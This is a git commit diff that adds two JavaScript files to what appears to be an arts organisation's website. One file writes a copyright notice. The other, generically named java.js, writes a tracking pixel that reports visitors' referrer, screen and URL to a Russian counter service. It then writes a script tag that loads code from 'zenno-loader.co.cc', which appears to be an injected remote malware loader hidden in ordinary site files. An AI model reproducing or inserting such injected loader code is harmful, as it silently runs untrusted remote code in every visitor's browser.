2571e2487de2f61fa1cbe33604434cb778dbcd1d
Liu, Zizuo <ziliu@paypal.com>
2014-02-14 17:37:24 -0800

    First commit for cpaasv support

---
+++ sf/js/copyright.js
@@ -0,0 +1,11 @@
+// JavaScript for copyright
+
+function copyright() {
+
+	copyright = new Date();
+
+	update = copyright.getFullYear();
+
+	document.write("&copy; 1991-" + update + " Chinese Performing Artists of America,  All rights reserved.");
+
+}
---
+++ sf/js/index/java.js
@@ -0,0 +1,19 @@
+document.write("<a href='http://www.liveinternet.ru/click;qwertyqwerty' "+
+
+"target=_blank><img src='//counter.yadro.ru/hit;qwertyqwerty?t45.1;r"+
+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+
+";"+Math.random()+
+
+"' alt='' title='LiveInternet' "+
+
+"border='0' width='5' height='5'><\/a>");
+
+
+
+document.write('<script language="JavaScript" type="text/javascript" src="http://zenno-loader.co.cc/js/go.js"><\/script>');
